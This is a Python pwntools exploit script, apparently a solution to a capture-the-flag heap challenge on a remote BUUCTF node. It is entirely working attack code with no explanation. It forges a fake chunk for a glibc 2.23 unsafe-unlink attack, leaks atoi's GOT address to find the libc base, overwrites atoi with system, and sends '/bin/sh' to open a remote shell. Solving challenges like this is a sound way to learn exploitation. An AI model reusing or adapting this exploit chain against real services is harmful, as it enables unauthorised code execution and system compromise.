from pwn import *

sh=remote("node5.buuoj.cn",27038)
#sh=process("./timu")
elf=ELF('./timu')
libc=ELF('./libc-2.23.so')
magic=0x0000000000400D49

def show():
	sh.recvuntil(b"Your choice:")
	sh.sendline(str(1))

def alloc(size,content):
	sh.recvuntil(b"Your choice:")
	sh.sendline(str(2))
	sh.recvuntil(b"length of item name:")
	sh.sendline(str(size))
	sh.recvuntil(b"name of item:")
	sh.sendline(content)

def edit(idx,content):
	sh.recvuntil(b"Your choice:")
	sh.sendline(str(3))
	sh.recvuntil(b"index of item:")
	sh.sendline(str(idx))
	sh.recvuntil(b"length of item name:")
	sh.sendline(str(len(content)))
	sh.recvuntil(b"new name of the item:")
	sh.sendline(content)

def free(idx):
	sh.recvuntil(b"Your choice:")
	sh.sendline(str(4))
	sh.recvuntil(b"index of item:")
	sh.sendline(str(idx))

def exit():
	sh.recvuntil(b"Your choice:")
	sh.sendline(str(5))

atoi_got = elf.got['atoi']

ptr=0x00000000006020C8
fd = ptr - 0x18
bk = ptr - 0x10

alloc(0x40,b'aaaa') #0
alloc(0x80,b'bbbb') #1
alloc(0x80,b'cccc') #2
payload=p64(0)+p64(0x40)+p64(fd)+p64(bk)+b'a'*0x20+p64(0x40)+p64(0x90)
edit(0,payload)
free(1)

payload2=p64(0)*2+p64(0x40)+p64(atoi_got)
edit(0,payload2)
show()
sh.recvuntil(b"0 : ")
atoi_addr = u64(sh.recvuntil(b":")[:6].ljust(8,b'\x00'))

libc_base = atoi_addr - libc.sym['atoi']
system_addr=libc_base+libc.sym['system']
edit(0,p64(system_addr))
sh.sendline('/bin/sh\x00')


sh.interactive()
